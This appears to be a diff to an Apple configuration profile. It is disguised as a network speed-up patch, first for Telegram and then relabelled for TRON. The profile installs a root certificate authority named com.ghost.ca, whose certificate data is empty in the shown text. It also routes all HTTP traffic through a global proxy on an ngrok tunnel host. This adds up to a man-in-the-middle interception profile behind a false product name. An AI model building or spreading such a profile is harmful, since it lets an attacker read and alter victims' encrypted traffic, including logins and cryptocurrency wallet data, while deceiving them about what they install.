@@ -6,6 +6,20 @@
     <array>
         <dict>
             <key>PayloadType</key>
+            <string>com.apple.security.root</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadIdentifier</key>
+            <string>com.ghost.ca</string>
+            <key>PayloadUUID</key>
+            <string>B2C3D4E5-F6A7-8901-BCDE-2345678901BC</string>
+            <key>PayloadContent</key>
+            <data>
+            </data>
+        </dict>
+
+        <dict>
+            <key>PayloadType</key>
             <string>com.apple.proxy.http.global</string>
             <key>PayloadVersion</key>
             <integer>1</integer>
@@ -19,28 +33,12 @@
             <string>opposite-chowder-prompter.ngrok-free.dev</string>
             <key>ProxyServerPort</key>
             <integer>443</integer>
-        </dict>
-
-        <dict>
-            <key>PayloadType</key>
-            <string>com.apple.security.root</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>PayloadIdentifier</key>
-            <string>com.ghost.ca</string>
-            <key>PayloadUUID</key>
-            <string>B2C3D4E5-F6A7-8901-BCDE-2345678901BC</string>
-            <key>PayloadContent</key>
-            <data>
-            </data>
-        </dict>
+            </dict>
     </array>
     <key>PayloadDisplayName</key>
-    <string>Telegram Network Accelerator</string>
+    <string>TRON 网络加速补丁</string>
     <key>PayloadIdentifier</key>
     <string>com.telegram.speedup</string>
-    <key>PayloadRemovalDisallowed</key>
-    <false/>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
